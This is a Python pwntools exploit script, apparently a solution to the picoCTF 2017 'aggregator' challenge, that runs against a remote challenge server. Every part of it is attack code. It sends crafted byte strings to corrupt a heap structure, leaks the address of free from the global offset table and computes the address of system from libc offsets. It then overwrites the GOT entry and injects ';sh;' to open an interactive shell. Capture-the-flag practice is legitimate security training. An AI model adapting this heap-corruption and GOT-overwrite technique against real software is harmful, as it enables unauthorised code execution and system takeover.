

### exploit_aggregator.py

from pwn import *
from time import sleep
import binascii

p = remote('shell2017.picoctf.com', 35227)


p.send('01-09-2014 87\n')
p.recv(timeout=0.5)
p.send('01-09-2014 95\n')
p.recv(timeout=0.5)
p.send('02-10-2014 55\n')
p.recv(timeout=0.5)
p.send('~01-09-2014\n')
p.recv(timeout=0.5)

# Spoof a dbchain entry.
p.send('\xf0\x1e\x60\x00' + '\x00'*20 + '\x01\x00\x00\x00\x00\x00\x00\x00' + '\x00'*8 + '\n')
p.recv(timeout=0.5)

# Read from the GOT.
p.send('a+01-2014\n')
free_addr = int(p.recv(timeout=0.5))
print(hex(free_addr))

server_libc_free_offset = 0x7c600
server_libc_system_offset = 0x41490

system_addr = free_addr - server_libc_free_offset + server_libc_system_offset
print("system_addr: " + hex(system_addr))

# Write to the GOT, by freeing and reusing a new dbchain.
p.send('01-20-2014 66\n')
p.recv(timeout=0.5)
p.send('~01-20-2014\n')
p.recv(timeout=0.5)
p.send('\xe8\x1e\x60\x00' + '\x00'*4 + '\x14' + '\x00'*15 + '\x01\x00\x00\x00\x00\x00\x00\x00' + '\x00'*8 + '\n')

p.recv(timeout=0.5)

p.send('01-20-2014 ' + str(system_addr) + '\n')
p.recv(timeout=0.5)
p.send('~01-20-2014;sh;\n')
p.interactive()